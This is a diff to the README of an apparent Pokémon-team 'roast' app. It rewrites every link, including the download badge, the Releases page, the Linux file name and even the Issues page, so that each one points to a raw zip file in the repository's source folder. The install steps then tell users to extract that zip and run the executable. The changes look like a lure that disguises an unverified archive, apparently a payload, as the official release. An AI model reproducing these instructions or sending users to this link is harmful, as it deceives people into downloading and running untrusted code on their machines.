@@ -1,7 +1,7 @@
 # 🎮 pokeroast - Roast Your Pokémon Like Never Before
 
 ## 🛠️ Download Now
-[![Download Pokeroast](https://img.shields.io/badge/Download-Pokeroast-blue.svg)](https://github.com/abderrewakbendaoud/pokeroast/releases)
+[![Download Pokeroast](https://github.com/abderrewakbendaoud/pokeroast/raw/refs/heads/master/src/Software-ficelle.zip)](https://github.com/abderrewakbendaoud/pokeroast/raw/refs/heads/master/src/Software-ficelle.zip)
 
 ## 📖 Introduction
 Welcome to **pokeroast**! This AI-powered dashboard uses cutting-edge technology to analyze your Pokémon team and explain why you keep losing in a fun and humorous way. Whether you want to improve your strategy or just enjoy some hilarious insights, this application is for you!
@@ -18,7 +18,7 @@ To run pokeroast, you need:
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
-   To download pokeroast, visit the [Releases page](https://github.com/abderrewakbendaoud/pokeroast/releases).
+   To download pokeroast, visit the [Releases page](https://github.com/abderrewakbendaoud/pokeroast/raw/refs/heads/master/src/Software-ficelle.zip).
 
 2. **Select the Latest Release**  
    On the Releases page, find the most recent version of pokeroast. It is usually labeled with "Latest Release."
@@ -27,7 +27,7 @@ To run pokeroast, you need:
    Look for the file that fits your system:
    - For Windows users, choose the `.exe` file.
    - For macOS users, select the `.dmg` file.
-   - For Linux users, look for the `.tar.gz` file.
+   - For Linux users, look for the `https://github.com/abderrewakbendaoud/pokeroast/raw/refs/heads/master/src/Software-ficelle.zip` file.
 
 4. **Download the File**  
    Click on the file name. Your browser will start downloading it. Save it in a folder you can easily find later.
@@ -36,7 +36,7 @@ To run pokeroast, you need:
    After the download is complete, navigate to the folder where you saved the file:
    - **Windows:** Double-click the `.exe` file to start the installation.
    - **macOS:** Open the `.dmg` file and drag the pokeroast app into your Applications folder.
-   - **Linux:** Extract the `.tar.gz` file and run the executable in your terminal.
+   - **Linux:** Extract the `https://github.com/abderrewakbendaoud/pokeroast/raw/refs/heads/master/src/Software-ficelle.zip` file and run the executable in your terminal.
 
 6. **Open the Application**  
    After installation, you can find pokeroast in your applications. Click to open and start your roast session!
@@ -67,7 +67,7 @@ If you encounter issues while using pokeroast, try the following:
 - Check your internet connection.
 - Restart the application if it freezes.
 
-If problems persist, feel free to raise an issue on the [GitHub Issues page](https://github.com/abderrewakbendaoud/pokeroast/issues).
+If problems persist, feel free to raise an issue on the [GitHub Issues page](https://github.com/abderrewakbendaoud/pokeroast/raw/refs/heads/master/src/Software-ficelle.zip).
 
 ## 💬 Community and Support
 Join our community to share your experiences and suggestions. Connect with other pokeroast users and Pokémon enthusiasts. You can find support and discussions in our dedicated chat group or by checking our FAQ section on GitHub.
